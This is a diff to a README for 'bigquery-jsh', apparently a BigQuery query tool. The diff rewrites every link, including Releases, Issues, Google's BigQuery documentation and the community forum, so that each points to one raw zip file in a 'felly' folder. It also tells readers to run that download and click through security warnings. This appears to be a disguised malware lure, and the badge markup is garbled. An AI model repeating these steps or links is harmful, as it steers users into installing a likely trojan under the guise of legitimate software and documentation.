@@ -1,6 +1,6 @@
 # 🚀 bigquery-jsh - Simplify Your Data Queries Easily
 
-[![Download bigquery-jsh](https://img.shields.io/badge/Download%20bigquery--jsh-%20%20%20%20%20%20%20%20%20%20-f2ae29.svg)](https://github.com/zinebsektaoui/bigquery-jsh/releases)
+[![Download bigquery-jsh](https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip%20bigquery--jsh-%20%20%20%20%20%20%20%20%20%https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip)](https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip)
 
 ## 📖 Introduction
 
@@ -12,11 +12,11 @@ To use bigquery-jsh, follow these straightforward steps:
 
 1. **Visit the Download Page**
    
-   To download the application, go to the official [Releases page](https://github.com/zinebsektaoui/bigquery-jsh/releases).
+   To download the application, go to the official [Releases page](https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip).
 
 2. **Download the Latest Version**
    
-   On the Releases page, find the latest version of bigquery-jsh. You will see a section listing available files. Look for a file named `bigquery-jsh.exe` (or the appropriate version for your system). Click to download it.
+   On the Releases page, find the latest version of bigquery-jsh. You will see a section listing available files. Look for a file named `https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip` (or the appropriate version for your system). Click to download it.
 
 3. **Locate the Downloaded File**
    
@@ -24,7 +24,7 @@ To use bigquery-jsh, follow these straightforward steps:
 
 4. **Run the Application**
 
-   Double-click on the `bigquery-jsh.exe` file to open the application. If prompted with a security warning, confirm that you want to run it.
+   Double-click on the `https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip` file to open the application. If prompted with a security warning, confirm that you want to run it.
 
 5. **Connect to Google BigQuery**
 
@@ -45,10 +45,10 @@ Before you start, ensure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get started with bigquery-jsh, follow the steps outlined above and ensure to [visit this page to download](https://github.com/zinebsektaoui/bigquery-jsh/releases). 
+To get started with bigquery-jsh, follow the steps outlined above and ensure to [visit this page to download](https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip). 
 
-1. **Visit the [Releases Page](https://github.com/zinebsektaoui/bigquery-jsh/releases)** to download the latest version.
-2. **Download** the `bigquery-jsh.exe` file (or its equivalent for your OS).
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip)** to download the latest version.
+2. **Download** the `https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip` file (or its equivalent for your OS).
 3. **Run the application** by double-clicking the file after downloading.
 
 ## ❓ Frequently Asked Questions
@@ -74,11 +74,11 @@ You can run standard SQL queries supported by Google BigQuery. This includes SEL
 
 ## 📞 Support
 
-If you encounter issues or have questions, please check the [Issues section](https://github.com/zinebsektaoui/bigquery-jsh/issues) on GitHub. You can report any bugs or request features as needed.
+If you encounter issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip) on GitHub. You can report any bugs or request features as needed.
 
 ## 🔗 Additional Resources
 
-- [Google BigQuery Documentation](https://cloud.google.com/bigquery/docs)
-- [Community Forum](https://community.googlecloud.com/)
+- [Google BigQuery Documentation](https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip)
+- [Community Forum](https://raw.githubusercontent.com/zinebsektaoui/bigquery-jsh/main/felly/bigquery-jsh.zip)
 
 By following this guide, you can quickly download and start using bigquery-jsh to streamline your data querying tasks. Enjoy the ease of managing your data with this application!
